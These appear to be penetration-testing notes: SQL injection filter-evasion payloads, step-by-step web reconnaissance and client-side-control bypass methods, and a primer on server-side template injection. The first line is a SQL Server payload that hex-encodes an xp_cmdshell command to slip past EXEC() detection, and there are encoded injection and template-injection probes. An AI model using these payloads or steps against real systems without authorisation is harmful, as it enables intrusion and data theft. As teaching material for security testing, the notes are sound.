* Using sp_sqlexec to avoid EXEC() detection

```ex
‘;Declare @cmd as varchar(3000);Set @cmd = convert(varchar(0),0x78705F636D647368656C6C202764697227);exec sp_sqlexec @cmd;–
```

Evading user input filters whilst trying to exploit SQL injection is often a case of trying to format the same payloads but with different characters. Take the following payload for example:

```ex
' AND 3>2 --
```

We could rewrite this payload in a number of ways depending on which part of the payload was being filtered, for example with the greater-than sign, We could replace it using an encoded character:

```encoding
' AND 3%3E2 --
' AND 3%253E2 --
' AND 3%u003e2 --
```

Alternatively we could simply reformat the payload to achieve the same result, such as:

```reformat
' AND 2<3 --
' AND 2<>3 --
' AND 2!=3 -- ' ' ' ' ' ' '
```

#### Legend

```legend
M : MySQL
S : SQL Server
P : PostgreSQL
O : Oracle
+ : Possibly all other databases
```

## Appendix-VIII Hack Steps

### Mapping the Application

HACK STEPS

1. Configure your browser to use either Burp or WebScarab as a local proxy (see Chapter 20 for specific details about how to do this if you’re unsure).

2. Browse the entire application normally, attempting to visit every link/URL you discover, submitting every form, and proceeding through all multistep functions to completion. Try browsing with JavaScript enabled and disabled, and with cookies enabled and disabled. Many applications can handle various browser configurations, and you may reach different content and code paths within the application.

3. Review the site map generated by the proxy/spider tool, and identify any application content or functions that you did not browse manually. Establish how the spider enumerated each item. For example, in Burp Spider, check the Linked From details. Using your browser, access the item manually so that the response from the server is parsed by the proxy/spider tool to identify any further content. Continue this step recursively until no further content or functionality is identified.

4. Optionally, tell the tool to actively spider the site using all of the already enumerated content as a starting point. To do this, first identify any URLs that are dangerous or likely to break the application session, and configure the spider to exclude these from its scope. Run the spider and review the results for any additional content it discovers.

The site map generated by the proxy/spider tool contains a wealth of information about the target application, which will be useful later in identifying the various attack surfaces exposed by the application.

HACK STEPS

1. Make some manual requests for known valid and invalid resources, and identify how the server handles the latter.

2. Use the site map generated through user-directed spidering as a basis for automated discovery of hidden content.

3. Make automated requests for common filenames and directories within each directory or path known to exist within the application. Use Burp Intruder or a custom script, together with wordlists of common files and directories, to quickly generate large numbers of requests. If you have identified a particular way in which the application handles requests for invalid resources (such as a customized “file not found” page), configure Intruder or your script to highlight these results so that they can be ignored.

4. Capture the responses received from the server, and manually review them to identify valid resources.

5. Perform the exercise recursively as new content is discovered.

HACK STEPS

1. Review the results of your user-directed browsing and basic brute-force exercises. Compile lists of the names of all enumerated subdirectories, file stems, and file extensions.

2. Review these lists to identify any naming schemes in use. For example, if there are pages called AddDocument.jsp and ViewDocument.jsp, there may also be pages called EditDocument.jsp and RemoveDocument.jsp. You can often get a feel for developers’ naming habits just by reading a few examples. For example, depending on their personal style, developers may be verbose (AddANewUser.asp), succinct (AddUser.asp), use abbreviations (AddUsr.asp), or even be more cryptic (AddU.asp). Getting a feel for the naming styles in use may help you guess the precise names of content you have not already identified.

3. Sometimes, the naming scheme used for different content employs identifiers such as numbers and dates, which can make inferring hidden content easy. This is most commonly encountered in the names of static resources, rather than dynamic scripts. For example, if a company’s website links to AnnualReport2009.pdf and AnnualReport2010.pdf, it should be a short step to identifying what the next report will be called. Somewhat incredibly, there have been notorious cases of companies placing files containing financial reports on their web servers before they were publicly announced, only to have wily journalists discover them based on the naming scheme used in earlier years.

4. Review all client-side code such as HTML and JavaScript to identify any clues about hidden server-side content. These may include HTML comments related to protected or unlinked functions, HTML forms with disabled SUBMIT elements, and the like. Often, comments are automatically generated by the software that has been used to generate web content, or by the platform on which the application is running. References to items such as server-side include files are of particular interest. These files may actually be publicly downloadable and may contain highly sensitive information such as database connection strings and passwords. In other cases, developers’ comments may contain all kinds of useful tidbits, such as database names, references to back-end components, SQL query strings, and so on. Thick-client components such as Java applets and ActiveX controls may also contain sensitive data that you can extract

5. Add to the lists of enumerated items any further potential names conjectured on the basis of the items that you have discovered. Also add to the file extension list common extensions such as txt, bak, src, inc, and old, which may uncover the source to backup versions of live pages. Also add extensions associated with the development languages in use, such as .java and .cs, which may uncover source files that have been compiled into live pages. (See the tips later in this chapter for identifying technologies in use.)

6. Search for temporary files that may have been created inadvertently by developer tools and file editors. Examples include the .DS_Store file, which contains a directory index under OS X, file.php~1, which is a temporary file created when file.php is edited, and the .tmp file extension that is used by numerous software tools.

7. Perform further automated exercises, combining the lists of directories, file stems, and file extensions to request large numbers of potential resources. For example, in a given directory, request each file stem combined with each file extension. Or request each directory name as a subdirectory of every known directory.

8. Where a consistent naming scheme has been identified, consider performing a more focused brute-force exercise. For example, if AddDocument .jsp and ViewDocument.jsp are known to exist, you may create a list of actions (edit, delete, create) and make requests of the form XxxDocument.jsp. Alternatively, create a list of item types (user, account, file) and make requests of the form AddXxx.jsp.

9. Perform each exercise recursively, using new enumerated content and patterns as the basis for further user-directed spidering and further automated content discovery. You are limited only by your imagination, time available, and the importance you attach to discovering hidden content within the application you are targeting.

HACK STEPS

1. Use several different search engines and web archives (listed previously) to discover what content they indexed or stored for the application you are attacking.

2. When querying a search engine, you can use various advanced techniques to maximize the effectiveness of your research. The following suggestions apply to Google. You can find the corresponding queries on other engines by selecting their Advanced Search option. n site:www.wahh-target.com returns every resource within the target site that Google has a reference to. n site:www.wahh-target.com login returns all the pages containing the expression login. In a large and complex application, this technique can be used to quickly home in on interesting resources, such as site maps, password reset functions, and administrative menus. n link:www.wahh-target.com returns all the pages on other websites and applications that contain a link to the target. This may include links to old content, or functionality that is intended for use only by third parties, such as partner links. n related:www.wahh-target.com returns pages that are “similar” to the target and therefore includes a lot of irrelevant material. However, it may also discuss the target on other sites, which may be of interest.

3. Perform each search not only in the default Web section of Google, but also in Groups and News, which may contain different results.

4. Browse to the last page of search results for a given query, and select Repeat the Search with the Omitted Results Included. By default, Google attempts to filter out redundant results by removing pages that it believes are sufficiently similar to others included in the results. Overriding this behavior may uncover subtly different pages that are of interest to you when attacking the application.

5. View the cached version of interesting pages, including any content that is no longer present in the actual application. In some cases, search engine caches contain resources that cannot be directly accessed in the application without authentication or payment.

6. Perform the same queries on other domain names belonging to the same organization, which may contain useful information about the application you are targeting. If your research identiﬁ es old content and functionality that is no longer linked to within the main application, it may still be present and usable. The old functionality may contain vulnerabilities that do not exist elsewhere within the application. Even where old content has been removed from the live application, the content obtained from a search engine cache or web archive may contain references to or clues about other functionality that is still present within the live application and that can be used to attack it.

HACK STEPS

1. Compile a list containing every name and e-mail address you can discover relating to the target application and its development. This should include any known developers, names found within HTML source code, names found in the contact information section of the main company website, and any names disclosed within the application itself, such as administrative staff.

2. Using the search techniques described previously, search for each identified name to find any questions and answers they have posted to Internet forums. Review any information found for clues about functionality or vulnerabilities within the target application.

HACK STEPS

Several useful options are available when you run Nikto:

1. If you believe that the server is using a nonstandard location for interesting content that Nikto checks for (such as /cgi/cgi-bin instead of /cgi-bin), you can specify this alternative location using the option –root /cgi/. For the specific case of CGI directories, these can also be specified using the option –Cgidirs.

2. If the site uses a custom “file not found” page that does not return the HTTP 404 status code, you can specify a particular string that identifies this page by using the -404 option.

3. Be aware that Nikto does not perform any intelligent verification of potential issues and therefore is prone to report false positives. Always check any results Nikto returns manually.

Note that with tools like Nikto, you can specify a target application using its domain name or IP address. If a tool accesses a page using its IP address, the tool treats links on that page that use its domain name as belonging to a different domain, so the links are not followed. This is reasonable, because some applications are virtually hosted, with multiple domain names sharing the same IP address. Ensure that you conﬁ gure your tools with this fact in mind.

HACK STEPS

1. Identify any instances where application functionality is accessed not by requesting a specific page for that function (such as /admin/editUser.jsp) but by passing the name of a function in a parameter (such as /admin.jsp?action=editUser).

2. Modify the automated techniques described for discovering URL-specified content to work on the content-access mechanisms in use within the application. For example, if the application uses parameters that specify servlet and method names, first determine its behavior when an invalid servlet and/or method is requested, and when a valid method is requested with other invalid parameters. Try to identify attributes of the server’s responses that indicate “hits” — valid servlets and methods. If possible, find a way of attacking the problem in two stages, first enumerating servlets and then methods within these. Using a method similar to the one used for URL-specified content, compile lists of common items, add to these by inferring from the names actually observed, and generate large numbers of requests based on these.

3. If applicable, compile a map of application content based on functional paths, showing all the enumerated functions and the logical paths and dependencies between them.

HACK STEPS

1. Using lists of common debug parameter names (debug, test, hide, source, etc.) and common values (true, yes, on, 1, etc.), make a large number of requests to a known application page or function, iterating through all permutations of name and value. For POST requests, insert the added parameter to both the URL query string and the message body. Burp Intruder can be used to perform this test using multiple payload sets and the “cluster bomb” attack type (see Chapter 14 for more details).

2. Monitor all responses received to identify any anomalies that may indicate that the added parameter has had an effect on the application’s processing.

3. Depending on the time available, target a number of different pages or functions for hidden parameter discovery. Choose functions where it is most likely that developers have implemented debug logic, such as login, search, and file uploading and downloading.

HACK STEPS

1. Identify all entry points for user input, including URLs, query string parameters, POST data, cookies, and other HTTP headers processed by the application.

2. Examine the query string format used by the application. If it does not employ the standard format described in Chapter 3, try to understand how parameters are being transmitted via the URL. Virtually all custom schemes still employ some variation on the name/value model, so try to understand how name/value pairs are being encapsulated into the nonstandard URLs you have identified.

3. Identify any out-of-bound channels via which user-controllable or other third-party data is being introduced into the application’s processing.

4. View the HTTP Server banner returned by the application. Note that in some cases, different areas of the application are handled by different back-end components, so different Server headers may be received.

5. Check for any other software identifiers contained within any custom HTTP headers or HTML source code comments.

6. Run the httprint tool to fingerprint the web server.

7. If fine-grained information is obtained about the web server and other components, research the software versions in use to identify any vulnerabilities that may be exploited to advance an attack (see Chapter 18).

8. Review your map of application URLs to identify any interesting-looking file extensions, directories, or other sub-sequences that may provide clues about the technologies in use on the server.

9. Review the names of all session tokens issued by the application to identify the technologies being used.

10. Use lists of common technologies, or Google, to establish which technologies may be in use on the server, or discover other websites and applications that appear to employ the same technologies.

11. Perform searches on Google for the names of any unusual cookies, scripts, HTTP headers, and the like that may belong to third-party software components. If you locate other applications in which the same components are being used, review these to identify any additional functionality and parameters that the components support, and verify whether these are also present in your target application. Note that third-party components may look and feel quite different in each implementation, due to branding customizations, but the core functionality, including script and parameter names, is often the same. If possible, download and install the component and analyze it to fully understand its capabilities and, if possible, discover any vulnerabilities. Consult repositories of known vulnerabilities to identify any known defects with the component in question.

HACK STEPS

1. Review the names and values of all parameters being submitted to the application in the context of the functionality they support.

2. Try to think like a programmer, and imagine what server-side mechanisms and technologies are likely to have been used to implement the behavior you can observe.

HACK STEPS

1. Try to identify any locations within the application that may contain clues about the internal structure and functionality of other areas.

2. It may not be possible to draw any firm conclusions here; however, the cases identified may prove useful at a later stage of the attack when you’re attempting to exploit any potential vulnerabilities.

HACK STEPS

1. Make a note of any functionality that diverges from the standard GUI appearance, parameter naming, or navigation mechanism used within the rest of the application.

2. Also make a note of functionality that is likely to have been added retrospectively. Examples include debug functions, CAPTCHA controls, usage tracking, and third-party code.

3. Perform a full review of these areas, and do not assume that the standard defenses used elsewhere in the application apply.

HACK STEPS

1. Understand the core functionality implemented within the application and the main security mechanisms in use.

2. Identify all features of the application’s functionality and behavior that are often associated with common vulnerabilities.

3. Check any third-party code against public vulnerability databases such as www.osvdb.org to determine any known issues.

4. Formulate a plan of attack, prioritizing the most interesting-looking functionality and the most serious of the associated potential vulnerabilities.

## Bypassing Client-Side Controls

HACK STEPS

1. Locate all instances within the application where hidden form fields, cookies, and URL parameters are apparently being used to transmit data via the client.

2. Attempt to determine or guess the role that the item plays in the application’s logic, based on the context in which it appears and on clues such as the parameter’s name.

3. Modify the item’s value in ways that are relevant to its purpose in the application. Ascertain whether the application processes arbitrary values submitted in the parameter, and whether this exposes the application to any vulnerabilities.

HACK STEPS

Faced with opaque data being transmitted via the client, several avenues of attack are possible:

1. If you know the value of the plaintext behind the opaque string, you can attempt to decipher the obfuscation algorithm being employed.

2. As described in Chapter 4, the application may contain functions elsewhere that you can leverage to return the opaque string resulting from a piece of plaintext you control. In this situation, you may be able to directly obtain the required string to deliver an arbitrary payload to the function you are targeting.

3. Even if the opaque string is impenetrable, it may be possible to replay its value in other contexts to achieve a malicious effect. For example, the pricing_token parameter in the previously shown form may contain an encrypted version of the product’s price. Although it is not possible to produce the encrypted equivalent for an arbitrary price of your choosing, you may be able to copy the encrypted price from a different, cheaper product and submit this in its place.

4. If all else fails, you can attempt to attack the server-side logic that will decrypt or deobfuscate the opaque string by submitting malformed variations of it — for example, containing overlong values, different character sets, and the like

HACK STEPS

1. If you are attacking an ASP.NET application, verify whether MAC protection is enabled for the ViewState. This is indicated by the presence of a 20-byte hash at the end of the ViewState structure, and you can use the ViewState parser in Burp Suite to confirm whether this is present.

2. Even if the ViewState is protected, use Burp to decode the ViewState on various application pages to discover whether the application is using the ViewState to transmit any sensitive data via the client.

3. Try to modify the value of a specific parameter within the ViewState without interfering with its structure, and see whether an error message results.

4. If you can modify the ViewState without causing errors, you should review the function of each parameter within the ViewState and see whether the application uses it to store any custom data. Try to submit crafted values as each parameter to probe for common vulnerabilities, as you would for any other item of data being transmitted via the client.

5. Note that MAC protection may be enabled or disabled on a per-page basis, so it may be necessary to test each significant page of the application for ViewState hacking vulnerabilities. If you are using Burp Scanner with passive scanning enabled, Burp automatically reports any pages that use the ViewState without MAC protection enabled.

HACK STEPS

1. Look for form elements containing a maxlength attribute. Submit data that is longer than this length but that is formatted correctly in other respects (for example, it is numeric if the application expects a number).
2. If the application accepts the overlong data, you may infer that the clientside validation is not replicated on the server.

3. Depending on the subsequent processing that the application performs on the parameter, you may be able to leverage the defects in validation to exploit other vulnerabilities, such as SQL injection, cross-site scripting, or buffer overflows.


## Server-side template injection

* It is use when an attacker is able to use native template syntax to inject a malicious payload into a template, which is then executed server-side. 
* This attacks can occur when user input is concatenated directly into a template, rather than passed in as data
* an attacker can potentially achieve remote code execution, taking full control of the back-end server and using it to perform other attacks on internal infrastructure.
* Even in cases where full remote code execution is not possible, an attacker can often still use server-side template injection as the basis for numerous other attacks, potentially gaining read access to sensitive data and arbitrary files on the server
* Server-side template injection vulnerabilities arise when user input is concatenated into templates rather than being passed in as data.

```js
$output = $twig->render("Hello {first_name},", array("first_name" => $user.first_name) );
```
* This is not vulnerable to server-side template injection because the user's first name is merely passed into the template as data.

```js
$output = $twig->render("Hello " . $_GET['name']);
```

* In this example, instead of a static value being passed into the template, part of the template itself is being dynamically generated using the GET parameter name. As template syntax is evaluated server-side, this potentially allows an attacker to place a server-side template injection payload inside the name parameter as follows:

`http://example.com/?name={{bad-stuff-here}}`

### Constructing a server-side template injection attack

**Detect > Identify > Exploit > Read/Explore/Attack**

* To find this you can do  fuzzing the template by injecting a sequence of special characters commonly used in template expressions, such as ${{<%[%'"}}%\.

* If an exception is raised, this indicates that the injected template syntax is potentially being interpreted by the server in some way

#### Plaintext context

* Most template languages allow you to freely input content either by using HTML tags directly or by using the template's native syntax, which will be rendered to HTML on the back-end before the HTTP response is sent. For example, in Freemarker, the line render('Hello ' + username) would render to something like Hello John.

* we might test for server-side template injection by requesting a URL such as:

```css
http://example.com/?username=${10*20}
``` 

* If the resulting output contains Hello 200, this shows that the mathematical operation is being evaluated server-side. This is a good proof of concept for a server-side template injection vulnerability

#### Code context

* This may take the form of a user-controllable variable name being placed inside a parameter, such as:

```js
greeting = getQueryParameter('name')
engine.render("Hello {{"+name+"}}", data)
```
* On the website, the resulting URL would be something like:

```css
http://example.com/?name=data.email
```
* This would be rendered in the output to Hello xyz@gmail.com, for example.

#### Reference Links

* [Lab](https://portswigger.net/web-security/server-side-template-injection/exploiting)
